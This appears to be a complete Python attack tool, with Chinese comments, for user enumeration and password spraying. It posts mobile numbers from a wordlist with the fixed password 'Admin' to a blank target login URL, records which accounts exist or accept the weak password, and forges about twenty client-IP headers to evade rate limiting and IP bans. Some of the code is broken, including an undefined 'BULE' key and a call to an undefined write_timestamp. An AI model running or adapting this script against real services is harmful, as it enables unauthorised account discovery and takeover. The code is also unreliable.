import asyncio
import requests
from concurrent.futures import ThreadPoolExecutor
import time
from colorama import Fore, Back, Style
import random

target_url = ""  # URL
username_dict = "PoneAK.txt"  # USER字典
password = "Admin"  # 固定密码
result_file = "TrueUser.txt"  # 筛选出来的结果保存在这里
max_workers = 170
max_retries = 7
retry_delay = 7
ip_change_interval = 10  # 每10次请求切换一次IP

# ANSI颜色码
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
ENDC = Style.RESET_ALL

# 背景颜色
BG_COLOR = {
    RED: Back.RED,
    BLUE: Back.BLUE,
    GREEN: Back.GREEN
}

# 随机IP生成


def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


def save_true_user(username):
    with open(result_file, "a") as file:
        file.write(username + "\n")


def hydra_brute_force(session, username):
    payload = {
        "mobile": username,
        "password": password,
        "data_type": "mobile"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Referer": "",# POST必要参数自己写
        "X-Forwarded-For": generate_random_ip(),
        "X-Forwarded": generate_random_ip(),
        "Forwarded-For": generate_random_ip(),
        "Forwarded": generate_random_ip(),
        "X-Forwarded-Proto": "https",
        "X-Forwarded-Host": "",# POST必要参数自己写
        "X-Remote-Ip": generate_random_ip(),
        "X-Remote-Addr": generate_random_ip(),
        "True-Client-Ip": generate_random_ip(),
        "X-Client-Ip": generate_random_ip(),
        "Client-Ip": generate_random_ip(),
        "X-Real-Ip": generate_random_ip(),
        "Ali-Cdn-Real-Ip": generate_random_ip(),
        "Cdn-Src-Ip": generate_random_ip(),
        "Cdn-Real-Ip": generate_random_ip(),
        "Cf-Connecting-Ip": generate_random_ip(),
        "X-Cluster-Client-Ip": generate_random_ip(),
        "Wl-Proxy-Client-Ip": generate_random_ip(),
        "Proxy-Client-Ip": generate_random_ip(),
        "Fastly-Client-Ip": generate_random_ip(),
        "True-Client-Ip": generate_random_ip(),
        "X-Originating-Ip": generate_random_ip(),
        "X-Host": "",# POST必要参数自己写
        "X-Custom-Ip-Authorization": generate_random_ip()
    }

    retries = 0
    while retries < max_retries:
        try:
            response = session.post(target_url, data=payload, headers=headers)
            if response.status_code == 200:
                json_data = response.json()
                if "message" in json_data and json_data["message"] == "\u5bc6\u7801\u9519\u8bef":
                    save_true_user(username)
                    print(
                        f"\n{RED}|{ENDC}\n{RED}|____________Get a real username!❤️{username} {ENDC}", end="", flush=True)
                    print(f"{BG_COLOR[RED]}__{ENDC}", end="", flush=True)
                elif "status" in json_data and json_data["status"] == 1:
                    save_true_user(username + " " + password)
                    print(
                        f"\n{BLUE}|{ENDC}\n{BLUE}|__|__|__________The user used a weak password!:){username} {password}{ENDC}", end="", flush=True)
                    print(f"{BG_COLOR[BLUE]}__{ENDC}", end="", flush=True)
                return

        except requests.exceptions.ConnectionError:
            print(
                f"{BLUE}\n|\n|_☠️UserName Error!{username}{ENDC}", end="", flush=True)
            print(f"{BG_COLOR[BULE]}__{ENDC}", end="", flush=True)
            retries += 1
            time.sleep(retry_delay)
            continue

        except Exception as e:
            print(
                f"{BLUE}\n|\n|_Error occurred for username: {username}{ENDC}", end="", flush=True)
            print(f"{BG_COLOR[BULE]}__{ENDC}", end="", flush=True)
            print(f"Error: {str(e)}")
            return

        finally:
            session.close()


async def process_username(session, username):
    loop.run_in_executor(executor, hydra_brute_force, session, username)


async def process_usernames(usernames):
    session = requests.Session()
    tasks = []
    ip_counter = 0
    for username in usernames:
        task = asyncio.ensure_future(process_username(session, username))
        tasks.append(task)
        ip_counter += 1
        if ip_counter == ip_change_interval:
            headers = session.headers
            headers["X-Forwarded-For"] = generate_random_ip()
            headers["X-Forwarded"] = generate_random_ip()
            headers["Forwarded-For"] = generate_random_ip()
            headers["Forwarded"] = generate_random_ip()
            headers["X-Remote-Ip"] = generate_random_ip()
            headers["X-Remote-Addr"] = generate_random_ip()
            headers["True-Client-Ip"] = generate_random_ip()
            headers["X-Client-Ip"] = generate_random_ip()
            headers["Client-Ip"] = generate_random_ip()
            headers["X-Real-Ip"] = generate_random_ip()
            headers["Ali-Cdn-Real-Ip"] = generate_random_ip()
            headers["Cdn-Src-Ip"] = generate_random_ip()
            headers["Cdn-Real-Ip"] = generate_random_ip()
            headers["Cf-Connecting-Ip"] = generate_random_ip()
            headers["X-Cluster-Client-Ip"] = generate_random_ip()
            headers["Wl-Proxy-Client-Ip"] = generate_random_ip()
            headers["Proxy-Client-Ip"] = generate_random_ip()
            headers["Fastly-Client-Ip"] = generate_random_ip()
            headers["True-Client-Ip"] = generate_random_ip()
            headers["X-Originating-Ip"] = generate_random_ip()
            ip_counter = 0
    await asyncio.gather(*tasks)

banner = r"""
   _____   ____  __.  ._.  __________                                               .___
  /  _  \ |    |/ _|  | |  \______   \_____    ______ ________  _  _____________  __| _/
 /  /_\  \|      <    |_|   |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | 
/    |    \    |  \   |-|   |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | 
\____|__  /____|__ \  | |   |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ | 
|       \/        \/  |_|                  \/     \/     \/                          \/ 
|__Ak     |__手术刀
|__7Bash  |__ICE
|_________|_______Bleeding from heart❤️ 
"""

print(f"{RED}{banner}{ENDC}")

with open(username_dict, "r") as file:
    usernames = file.read().splitlines()

loop = asyncio.get_event_loop()
executor = ThreadPoolExecutor(max_workers=max_workers)
loop.run_until_complete(process_usernames(usernames))

while True:
    print(f"{GREEN}\n|\n|___10 S～{ENDC} ", end="", flush=True)
    print(f"{BG_COLOR[GREEN]}__{ENDC}", end="", flush=True)
    time.sleep(10)
    if time.time() % 300 == 0:
        write_timestamp()
